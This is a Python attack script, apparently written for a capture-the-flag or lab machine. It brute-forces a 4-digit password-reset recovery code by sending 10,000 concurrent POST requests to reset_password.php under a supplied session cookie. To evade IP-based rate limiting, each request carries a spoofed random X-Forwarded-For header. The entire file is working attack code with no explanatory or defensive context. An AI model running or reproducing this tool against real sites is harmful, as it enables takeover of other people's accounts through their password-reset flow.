import requests
import random
import concurrent.futures
import time
import argparse

# Function to generate a random 4-digit code
def generate_recovery_code():
    return f"{random.randint(0, 9999):04d}"

# Function to generate a random IP address
def generate_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

# Function to send a brute-force request
def brute_force_request(url, cookie, recovery_code):
    headers = {
        "Host": url.split("//")[1],
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": url,
        "Connection": "keep-alive",
        "Referer": f"{url}/reset_password.php",
        "Cookie": f"PHPSESSID={cookie}",
        "Upgrade-Insecure-Requests": "1",
        "X-Forwarded-For": generate_random_ip()
    }
    
    data = {
        "recovery_code": recovery_code,
        "s": "17223413214"  # Example static parameter
    }
    
    response = requests.post(f"{url}/reset_password.php", headers=headers, data=data)
    
    if "Invalid or expired recovery code!" not in response.text:
        return recovery_code
    return None

# Main function to run the brute-force attack
def brute_force_attack(url, cookie):
    start_time = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        future_to_code = {executor.submit(brute_force_request, url, cookie, f"{i:04d}"): i for i in range(10000)}
        for future in concurrent.futures.as_completed(future_to_code):
            recovery_code = future.result()
            if recovery_code is not None:
                print(f"Success! Recovery code is: {recovery_code}")
                return
    
    end_time = time.time()
    print(f"Brute-force attempt finished in {end_time - start_time:.2f} seconds.")

# Argument parser for command-line input
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute-force 4-digit recovery code")
    parser.add_argument("url", help="Target URL (e.g., http://10.10.223.63:1337)")
    parser.add_argument("cookie", help="PHPSESSID cookie value")

    args = parser.parse_args()

    # Run the brute-force attack with provided arguments
    brute_force_attack(args.url, args.cookie)
